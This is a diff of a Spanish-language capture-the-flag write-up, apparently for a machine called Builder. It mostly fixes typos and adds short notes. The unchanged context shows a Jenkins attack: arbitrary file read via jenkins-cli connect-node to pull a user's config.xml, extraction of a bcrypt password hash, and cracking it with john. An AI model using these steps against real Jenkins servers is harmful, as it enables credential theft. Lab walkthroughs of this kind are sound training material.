@@ -140,7 +140,7 @@ sudo docker pull jenkins/jenkins:lts-jdk17
 sudo docker run -p 8080:8080 --restart=on-failure jenkins/jenkins:lts-jdk17
 ```
 
-al realizar la instalacion nos daran la contreña para acabar de configurar nuestra instancia de jenkins que usaremos posteriormente
+al realizar la instalacion nos daran la contraseña para acabar de configurar nuestra instancia de jenkins que usaremos posteriormente
 
 ![s2.2](./imgs-builder/i8.png)
 
@@ -172,7 +172,7 @@ Iniciamos el contenedor y accedemos a el desde su consola
 
 ![s2.9](./imgs-builder/i14.png)
 
-Nos dirijimos al directorio raiz y listamos los archivos
+Nos dirigimos al directorio raiz y listamos los archivos
 
 ```bash
 cd
@@ -195,7 +195,7 @@ Del cual obtenemos nuestro hash de contraseña
 <passwordHash>#jbcrypt:$2a$10$ZuR0naycyABb5PH26DIsNuLbrEHBOmAL21lj3nxCrNb.chGXs7RVi</passwordHash>
 ```
 
-Entonces, hemos encontrado una forma válida de extraer hashes de contraseñas y nombres de usuarios de una instalación de Jenkins. Probémoslo en el servidor remoto usando la opción de lectura de archivos arbitrarios nos dirijimos a nuestra terminal y ejecutamos.
+Entonces, hemos encontrado una forma válida de extraer hashes de contraseñas y nombres de usuarios de una instalación de Jenkins. Probémoslo en el servidor remoto usando la opción de lectura de archivos arbitrarios nos dirigimos a nuestra terminal y ejecutamos.
 
 ```bash
 java -jar jenkins-cli.jar -noCertificateCheck -s 'http://{target_IP}:8080'
@@ -214,20 +214,21 @@ Nota: El comando connect-node funcionó porque el atributo denyAnonymousReadAcce
 
 ![s2.12](./imgs-builder/i20.png)
 
-De esta informacion lo mas relevante que obtenemo es:
+De esta informacion lo mas relevante que obtenemos es:
 
 ```bash
 # El usuario : jennifer
 jennifer
-# La ruta del dirctorio
+# La ruta del directorio
 jennifer_12108429903186576833
+# Al igual que en nuestro jenkins anteriormente configurado en docker, deducimos que ambas versiones tienen la misma ruta, entonces ya tenemos el directorio para acceder al archivo config.xml
 ```
 
 como ya habiamos visto en anteriores pasos, en jenkins dentro de esa ruta se almacena un archivo de configuración
 
 ![s2.13](./imgs-builder/i22.png)
 
-Asi que deducimos que en esta isntancia de jenkins tambien ocurre lo mismo por lo tanto visualizamos lo que se encuentra en este archivo con esa nueva ruta
+Asi que deducimos que en esta instancia de jenkins tambien ocurre lo mismo por lo tanto visualizamos lo que se encuentra en este archivo con esa nueva ruta
 
 ```bash
 java -jar jenkins-cli.jar -noCertificateCheck -s 'http://{target_IP}:8080' connect-node "@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml"
@@ -244,6 +245,8 @@ De todo este mar de informacion solo nos importa es el passwordhash
 ![s2.15](./imgs-builder/i24.png)
 
 guardamos el hash en un archivo y usamo john (herramienta de descifrado de contraseñas y hashes de seguridad)
+
+> Nota.- las claves decifradas con john se almacenan en el archivo ~/.john/john.pot
 
 ![s2.16](./imgs-builder/i25.png)
 
